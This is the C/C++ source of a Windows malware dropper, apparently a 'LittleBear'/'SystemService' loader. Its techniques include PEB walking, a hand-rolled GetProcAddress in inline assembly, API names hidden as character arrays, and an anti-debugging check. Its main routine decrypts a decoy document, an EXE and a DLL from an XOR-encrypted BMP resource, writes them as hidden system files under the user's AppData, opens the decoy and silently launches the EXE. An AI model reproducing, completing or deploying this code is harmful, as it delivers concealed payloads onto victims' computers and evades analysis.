#include <windows.h>
#include <lm.h>
#include "winternl.h"  
#include "decryptfrombmp.h"




FARPROC MyGetProcAddr(HMODULE hKernel32)
{
#ifndef _WIN64
	FARPROC pGetProcAddr = 0;
	__asm
	{
		pushad
			mov edi,hKernel32

			mov eax,[edi+3ch];pe header

			mov edx,[edi+eax+78h]

		add edx,edi

			mov ecx,[edx+18h];number of functions

			mov ebx,[edx+20h]

		add ebx,edi;AddressOfName

search:

		dec ecx

			mov esi,[ebx+ecx*4]

		add esi,edi;

		mov eax,0x50746547;PteG("GetP")

			cmp [esi],eax

			jne search

			mov eax,0x41636f72;Acor("rocA")

			cmp [esi+4],eax

			jne search

			mov ebx,[edx+24h]

		add ebx,edi;indexaddress

			mov cx,[ebx+ecx*2]

		mov ebx,[edx+1ch]

		add ebx,edi

			mov eax,[ebx+ecx*4]

		add eax,edi

			mov pGetProcAddr,eax
			popad
	}

	return  pGetProcAddr;

#else
	return (FARPROC)GetProcAddress;
#endif
}



HMODULE GetDllKernel32Base()
{
#ifndef _WIN64
	HMODULE hKernel32 = 0;
	__asm
	{
		//assume fs:nothing
		push esi
			xor eax,eax
			mov eax,fs:[eax+30h]    ;指向PEB的指针   
			mov eax,[eax+0ch]		;指向PEB_LDR_DATA的指针   
			mov esi,[eax+0ch]		;根据PEB_LDR_DATA得出InLoadOrderModuleList的Flink字段   
			lodsd
			mov eax, [eax]			;指向下一个节点
			mov eax,[eax+18h]		;Kernel.dll的基地址  
			mov hKernel32,eax
			pop esi
	}

	return hKernel32;
#else
	char szKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	return GetModuleHandleA(szKernel32);

#endif
}



DWORD GetApi()
{
	lpDllKernel32 = (HMODULE)GetDllKernel32Base();
	if (lpDllKernel32 == 0)
	{
		return FALSE;
	}
	//char szDllKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	lpGetProcAddress = (ptrGetProcAddress)MyGetProcAddr(lpDllKernel32);
	char szLoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
	lpLoadLibraryA = (ptrLoadLibraryA)lpGetProcAddress(lpDllKernel32,szLoadLibraryA);

	char szFindResourceA[] = {'F','i','n','d','R','e','s','o','u','r','c','e','A',0};
	char szSizeofResource[] = {'S','i','z','e','o','f','R','e','s','o','u','r','c','e',0};
	char szLoadResource[] = {'L','o','a','d','R','e','s','o','u','r','c','e',0};
	char szLockResource[] = {'L','o','c','k','R','e','s','o','u','r','c','e',0};
	char szGetSystemTime[] = {'G','e','t','S','y','s','t','e','m','T','i','m','e',0};
	char szGetTickCount[] = {'G','e','t','T','i','c','k','C','o','u','n','t',0};
	char szGetSystemDirectoryA[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0};
	char szCreateFileA[] = {'C','r','e','a','t','e','F','i','l','e','A',0};
	char szCloseHandle[] = {'C','l','o','s','e','H','a','n','d','l','e',0};
	char szWriteFile[] = {'W','r','i','t','e','F','i','l','e',0};
	char szReadFile[] = {'R','e','a','d','F','i','l','e',0};
	char szlstrlenA[]				= {'l','s','t','r','l','e','n','A',0};
	char szlstrcpyA[]				= {'l','s','t','r','c','p','y','A',0};
	char szlstrcatA[]				= {'l','s','t','r','c','a','t','A',0};
	char szExitProcess[]			= {'E','x','i','t','P','r','o','c','e','s','s',0};
	char szWinExec[]				= {'W','i','n','E','x','e','c',0};
	char szSetFileAttributesA[]		= {'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A',0};
	lplstrlenA = (ptrlstrlenA)lpGetProcAddress(lpDllKernel32,szlstrlenA);
	lplstrcatA	= (ptrlstrcatA)lpGetProcAddress(lpDllKernel32,szlstrcatA);
	lplstrcpyA	= (ptrlstrcpyA)lpGetProcAddress(lpDllKernel32,szlstrcpyA);
	lpExitProcess = (ptrExitProcess)lpGetProcAddress(lpDllKernel32,szExitProcess);
	lpWinExec = (ptrWinExec)lpGetProcAddress(lpDllKernel32,szWinExec);
	lpSetFileAttributesA = (ptrSetFileAttributesA)lpGetProcAddress(lpDllKernel32,szSetFileAttributesA);

	lpFindResourceA = (ptrFindResourceA)lpGetProcAddress(lpDllKernel32,szFindResourceA);
	lpSizeofResource = (ptrSizeofResource)lpGetProcAddress(lpDllKernel32,szSizeofResource);
	lpLoadResource = (ptrLoadResource)lpGetProcAddress(lpDllKernel32,szLoadResource);
	lpLockResource = (ptrLockResource)lpGetProcAddress(lpDllKernel32,szLockResource);
	lpGetSystemDirectoryA = (ptrGetSystemDirectoryA)lpGetProcAddress(lpDllKernel32,szGetSystemDirectoryA);
	lpGetSystemTime = (ptrGetSystemTime)lpGetProcAddress(lpDllKernel32,szGetSystemTime);
	lpGetTickCount = (ptrGetTickCount)lpGetProcAddress(lpDllKernel32,szGetTickCount);
	lpCreateFileA = (ptrCreateFileA)lpGetProcAddress(lpDllKernel32,szCreateFileA);
	lpCloseHandle = (ptrCloseHandle)lpGetProcAddress(lpDllKernel32,szCloseHandle);
	lpWriteFile = (ptrWriteFile)lpGetProcAddress(lpDllKernel32,szWriteFile);
	lpReadFile = (ptrReadFile)lpGetProcAddress(lpDllKernel32,szReadFile);
	char szGetComputerNameA[] = {'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0};
	lpGetComputerNameA = (ptrGetComputerNameA)lpGetProcAddress(lpDllKernel32,szGetComputerNameA);

	char szDllUser32[] = {'u','s','e','r','3','2','.','d','l','l',0};
	char szwsprintfA[] = {'w','s','p','r','i','n','t','f','A',0};
	lpDllUser32 = lpLoadLibraryA(szDllUser32);
	lpwsprintfA = (ptrwsprintfA)lpGetProcAddress(lpDllUser32,szwsprintfA);

	char szAdvapi32[] = {'A','d','v','a','p','i','3','2','.','d','l','l',0};
	lpDllAdiapi32 = lpLoadLibraryA(szAdvapi32);
	char szGetUserNameA[] = {'G','e','t','U','s','e','r','N','a','m','e','A',0};
	lpGetUserNameA = (ptrGetUserNameA)lpGetProcAddress(lpDllAdiapi32,szGetUserNameA);


	char szDllShell32[]	= {'s','h','e','l','l','3','2','.','d','l','l',0};
	char szShellExecuteA [] = {'S','h','e','l','l','E','x','e','c','u','t','e','A',0};
	lpDllShell32 = lpLoadLibraryA(szDllShell32);
	lpShellExecuteA = (ptrShellExecuteA)lpGetProcAddress(lpDllShell32,szShellExecuteA);

	char szDllNetapi32[] = {'n','e','t','a','p','i','3','2','.','d','l','l',0};
	lpDllNetApi32 = lpLoadLibraryA(szDllNetapi32);
	char szNetWkstaGetInfo[] = {'N','e','t','W','k','s','t','a','G','e','t','I','n','f','o',0};
	char szNetApiBufferFree[] = {'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e',0};
	lpNetWkstaGetInfo = (ptrNetWkstaGetInfo)lpGetProcAddress(lpDllNetApi32,szNetWkstaGetInfo);
	lpNetApiBufferFree =(ptrNetApiBufferFree) lpGetProcAddress(lpDllNetApi32,szNetApiBufferFree);

	char szMakeSureDirectoryPathExists[] = {'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0};
	char szDllDbghlp[] = {'d','b','g','h','e','l','p','.','d','l','l',0};
	lpDllDbghlp = lpLoadLibraryA(szDllDbghlp);
	lpMakeSureDirectoryPathExists = (ptrMakeSureDirectoryPathExists) lpGetProcAddress(lpDllDbghlp,szMakeSureDirectoryPathExists);
	return TRUE;
}


void CryptData(unsigned char * lpsrc,unsigned char * lpdst, int size, unsigned char * pkey, int keylen) {

	for (int i = 0, j = 0; i < size;)
	{
		lpdst[i] = lpsrc[i] ^ pkey[j];
		j++;
		if (j == keylen)
		{
			j = 0;
		}
		i++;
	}
}






DWORD DecryptAndWriteFile(unsigned char * pKey,unsigned char * pRdata,int iSize,char * pFileName)
{
	if (iSize <= 0)
	{
		return FALSE;
	}

	unsigned char * pFile = (unsigned char *) new char[iSize];
	for(int i = 0, j = 0; i < iSize;)
	{
		pFile[i] = pKey[j] ^ pRdata[i];
		j ++;
		if (j % CRYPT_KEY_SIZE == 0)
		{
			j = 0; 
		}
		i ++;
	}

	HANDLE hFile = lpCreateFileA(pFileName,GENERIC_WRITE,0,0,OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL| FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		delete[]pFile;
		return FALSE;
	}

	DWORD dwCnt = 0;
	int iRet = lpWriteFile(hFile,pFile,iSize,&dwCnt,0);
	lpCloseHandle(hFile);
	delete[]pFile;
	if (iRet == 0 || dwCnt != iSize)
	{
		return FALSE;
	}
	iRet = lpSetFileAttributesA(pFileName,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	if (iRet == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}







int GetUserAndComputerName(char * szUsername,char * szComputerName)
{
	DWORD dwSize = MAX_PATH;
	int iRet = lpGetUserNameA(szUsername,&dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	dwSize = MAX_PATH;
	iRet = lpGetComputerNameA(szComputerName,&dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	return TRUE;
}



int GetWindowsVersion()
{
	WKSTA_INFO_100 *wkstaInfo = NULL;
	NET_API_STATUS netStatus = lpNetWkstaGetInfo(NULL, 100, (LPBYTE *)&wkstaInfo);
	if (netStatus == NERR_Success) 
	{
		DWORD dwMajVer = wkstaInfo->wki100_ver_major;
		DWORD dwMinVer = wkstaInfo->wki100_ver_minor;
		DWORD dwVersion = (DWORD)MAKELONG(dwMinVer, dwMajVer);
		netStatus = lpNetApiBufferFree(wkstaInfo);

		char strWin9x[]		= {'W','i','n','d','o','w','s',' ','9','.','x',0};
		char strWin2000[]	= {'W','i','n','d','o','w','s',' ','2','0','0','0',0};
		char strWinXP[]		= {'W','i','n','d','o','w','s',' ','X','P',0};
		char strWinVista[]	= {'W','i','n','d','o','w','s',' ','V','i','s','t','a',0};
		char strWin7[]		= {'W','i','n','d','o','w','s',' ','7',0};
		char strWin8[]		= {'W','i','n','d','o','w','s',' ','8',0};
		char strWin10[]		= {'W','i','n','d','o','w','s',' ','1','0',0};
		char strWinUnknow[] = {'U','n','k','n','o','w',0};

		int iSystemVersion = 0;
		if (dwVersion < 0x50000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN9X;
		}
		else if (dwVersion == 0x50000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN2000;
		}
		else if (dwVersion > 0x50000 && dwVersion < 0x60000)
		{
			iSystemVersion = SYSTEM_VERSION_XP;
		}
		else if (dwVersion == 0x60000)
		{
			iSystemVersion = SYSTEM_VERSION_VISTA;
		}
		else if (dwVersion == 0x60001)
		{
			iSystemVersion = SYSTEM_VERSION_WIN7;
		}
		else if (dwVersion >= 0x60002 && dwVersion <= 0x60003)
		{
			iSystemVersion = SYSTEM_VERSION_WIN8;
		}
		else if (dwVersion >= 0x60003 || dwVersion >= 0x100000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN10;
		}
		else
		{
			iSystemVersion = SYSTEM_VERSION_UNKNOW;
		}
		return iSystemVersion;
	}

	return FALSE;
}







int  PebNtGlobalFlagsApproach()
{
#ifndef _WIN64
	int result = 0;
	__asm
	{
		// 进程的PEB
		mov eax, fs:[30h]
		// 控制堆操作函数的工作方式的标志位
		mov eax, [eax + 68h]
		// 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, 
		// FLG_HEAP_ENABLE_FREE_CHECK and FLG_HEAP_VALIDATE_PARAMETERS，
		// 它们的并集就是x70
		// 下面的代码相当于C/C++的
		// eax = eax & 0x70
		and eax, 0x70
			mov result, eax
	}

	return result != 0;
#else
	return IsDebuggerPresent();
#endif
}



DWORD IfDebuggerExist()
{
	int iRet = PebNtGlobalFlagsApproach();
	if(iRet)
	{
#ifndef _DEBUG
		return TRUE;
#else
		return FALSE;
#endif

	}

	return FALSE;
}



DWORD __stdcall MainProc()
{
	int iRet = IfDebuggerExist();
	if (iRet)
	{
		return FALSE;
	}
	iRet = GetApi();
	if(iRet == FALSE){
		return FALSE;
	}
	char szUserName[MAX_PATH];
	char szComputerName[MAX_PATH];
	iRet = GetUserAndComputerName(szUserName,szComputerName);
	int iSystemVersion = GetWindowsVersion();

	char szDstPath[MAX_PATH];

	char  LITTLEBEARNAME[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };
	char szDstPathWin7[] = {'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
		'l','o','c','a','l','\\','%','s','\\',0};
	char szDstPathXP[] ={'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'%','s','\\',0};

	//char szDstPathWin7[MAX_PATH] = {'C',':','\\','P','r','o','g','r','a','m','D','a','t','a','\\','s','e','r','v','i','c','e','s','\\',0};
	//char szDstPathXP[MAX_PATH] = {'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s',' ','(','x','8','6',')','\\','s','e','r','v','i','c','e','s','\\',0};

	char szSysDir[MAX_PATH];
	iRet = lpGetSystemDirectoryA(szSysDir,MAX_PATH);
	szDstPathWin7[0] = szSysDir[0];
	szDstPathXP[0] = szSysDir[0];

	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		//lplstrcpyA(szDstPath,szDstPathWin7);
		lpwsprintfA(szDstPath,szDstPathWin7,szUserName,LITTLEBEARNAME);
	}else{
		lpwsprintfA(szDstPath,szDstPathXP,szUserName, LITTLEBEARNAME);
		//lplstrcpyA(szDstPath,szDstPathXP);
	}

	iRet = lpMakeSureDirectoryPathExists(szDstPath);
	if (iRet == FALSE)
	{
		//iRet = GetLastError();
		return FALSE;
	}

	/*
	HRSRC hResPicture = lpFindResourceA(0,(LPCSTR)SOURCE_DATA,(LPCSTR)RT_RCDATA);
	if (hResPicture)
	{
		DWORD dwPicSize = lpSizeofResource(0,hResPicture);
		if (dwPicSize <= 0) {
			return FALSE;
		}

		HGLOBAL hGbPic = lpLoadResource(0,hResPicture);
		if (hGbPic)
		{
			void * lppicdata = lpLockResource(hGbPic);
			if (lppicdata)
			{
				char szpicpath[MAX_PATH];
				lplstrcpyA(szpicpath,szDstPath);
#ifdef OPEN_FILE_TYPE_BMP
					char sztmppicname[] = { 't','m','p','.','b','m','p',0 };
#elif defined OPEN_FILE_TYPE_DOC
					char sztmppicname[] = { 't','m','p','.','d','o','c',0 };
#elif defined OPEN_FILE_TYPE_PDF
				char sztmppicname[] = { 't','m','p','.','p','d','f',0 };
#endif
				lplstrcatA(szpicpath, sztmppicname);

				HANDLE hfpic=lpCreateFileA(szpicpath,GENERIC_READ|GENERIC_WRITE,0,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
				if (hfpic != INVALID_HANDLE_VALUE)
				{
					DWORD dwcnt = 0;
					int ret = lpWriteFile(hfpic,lppicdata,dwPicSize,&dwcnt,0);
					lpCloseHandle(hfpic);
					char szcmdpic[MAX_PATH];
					char szcmdpicformat[] = {'c','m','d',' ','/','c',' ','%','s',0};
					lpwsprintfA(szcmdpic,szcmdpicformat,szpicpath);
					ret = lpWinExec(szcmdpic,SW_SHOW);
					if (ret == FALSE)
					{
						return FALSE;
					}
				}
			}
		}
	}*/

	char szopenname[MAX_PATH];
	char szexename[MAX_PATH];
	char szdllname[MAX_PATH];
	HRSRC hResExe = lpFindResourceA(0,(LPCSTR)EMBEDDED_DATA_BMP,(LPCSTR)RT_BITMAP);
	if (hResExe)
	{
		DWORD dwExeSize = lpSizeofResource(0,hResExe);
		if (dwExeSize <= 0)
		{
			return FALSE;
		}

		HGLOBAL hGbExe = lpLoadResource(0,hResExe);
		if (hGbExe)
		{
			void * pbmpdata = lpLockResource(hGbExe);
			if (pbmpdata)
			{
				LPBMPEMBEDDEDFILEINFO lpembeddata = ( LPBMPEMBEDDEDFILEINFO)((char*)pbmpdata + sizeof(BITMAPINFOHEADER));

				unsigned char * pKey = (unsigned char*)lpembeddata->key;

				char * lpopen = (char*)lpembeddata + sizeof(BMPEMBEDDEDFILEINFO);

				char * lpexe = lpopen + lpembeddata->openfilelen;

				char * lpdll = lpexe + lpembeddata->exelen;

				lplstrcpyA(szopenname, szDstPath);
				unsigned char sztmpopenfn[MAX_PATH] = { 0 };
				CryptData((unsigned char*)(lpembeddata->openfilename),sztmpopenfn,lpembeddata->openfnlen, lpembeddata->key,CRYPT_KEY_SIZE);
				lplstrcatA(szopenname, (char*)sztmpopenfn);
				iRet = DecryptAndWriteFile(pKey, (unsigned char*)lpopen, lpembeddata->openfilelen, szopenname);
				if (iRet == 0)
				{
					return FALSE;
				}
				else {
					char szcmdpic[MAX_PATH];
					char szcmdpicformat[] = { 'c','m','d',' ','/','c',' ','%','s',0 };
					lpwsprintfA(szcmdpic, szcmdpicformat, szopenname);
					iRet = lpWinExec(szcmdpic, SW_HIDE);
					if (iRet <= 31)
					{
						return FALSE;
					}
				}
				
				lplstrcpyA(szexename,szDstPath);
				unsigned char sztmpexefn[MAX_PATH] = { 0 };
				CryptData((unsigned char*)(lpembeddata->exefilename),sztmpexefn,lpembeddata->exefnlen, lpembeddata->key, CRYPT_KEY_SIZE);
				lplstrcatA(szexename, (char*)sztmpexefn);
				iRet = DecryptAndWriteFile(pKey,(unsigned char*)lpexe ,lpembeddata->exelen,szexename);
				if (iRet == 0)
				{
					return FALSE;
				}
				
				lplstrcpyA(szdllname,szDstPath);
				unsigned char sztmpdllfn[MAX_PATH] = { 0 };
				CryptData((unsigned char*)(lpembeddata->dllfilename),sztmpdllfn,lpembeddata->dllfnlen, lpembeddata->key, CRYPT_KEY_SIZE);
				lplstrcatA(szdllname,(char*)sztmpdllfn);
				iRet = DecryptAndWriteFile(pKey,(unsigned char*)lpdll ,lpembeddata->dlllen,szdllname);
				if (iRet == 0)
				{
					return FALSE;
				}

				char szCmd[MAX_PATH] = {0};
				//wsprintfA(szCmd,"\"%s\" STARTFIRSTTIME",szDstExePath);
				//iRet = WinExec(szCmd,SW_HIDE);
				char szShellExecuteAOpen[] = {'o','p','e','n',0};
				char szStartFirstTime[] = {'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0};
				HINSTANCE hInst = lpShellExecuteA(0,szShellExecuteAOpen,szexename,szStartFirstTime,0,0);
				return TRUE;
			}
		}
	}

	return FALSE;
}



LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_QUIT: {
		PostQuitMessage(0);
		return 0;
	}
	}
	return DefWindowProcA(hwnd, message, wParam, lParam);
}




int WINAPI CreateWatcherWindow()
{
	CHAR szWindowClassName[] = { 'u','s','b','w','a','t','c','h','e','r',0 };
	WNDCLASSEXA        wndclassex = { 0 };
	wndclassex.cbSize = sizeof(WNDCLASSEXA);
	wndclassex.style = 0;
	wndclassex.lpfnWndProc = WndProc;
	wndclassex.cbClsExtra = 0;
	wndclassex.cbWndExtra = 0;
	wndclassex.hInstance = 0;
	wndclassex.hIcon = 0;
	wndclassex.hCursor = 0;
	wndclassex.hbrBackground = 0;
	wndclassex.lpszMenuName = 0;
	wndclassex.lpszClassName = szWindowClassName;

	int ret = ret = RegisterClassExA(&wndclassex);
	if (ret == FALSE)
	{
		return FALSE;
	}

	HWND hwnd = CreateWindowExA(WS_EX_OVERLAPPEDWINDOW, szWindowClassName, 0, WS_DISABLED, 0, 0, 0, 0, NULL, NULL, 0, NULL);
	if (hwnd == FALSE) {
		return FALSE;
	}

	MSG msg = { 0 };
	while (GetMessageA(&msg, NULL, 0, 0))
	{
		ret = TranslateMessage(&msg);
		ret = DispatchMessageA(&msg);
	}

	ret = UnregisterClassA(szWindowClassName, 0);
	return msg.wParam;
}





int _stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CreateWatcherWindow, 0, 0, 0));
	int iRet = MainProc();
	//lpExitProcess(0);
	return TRUE;
}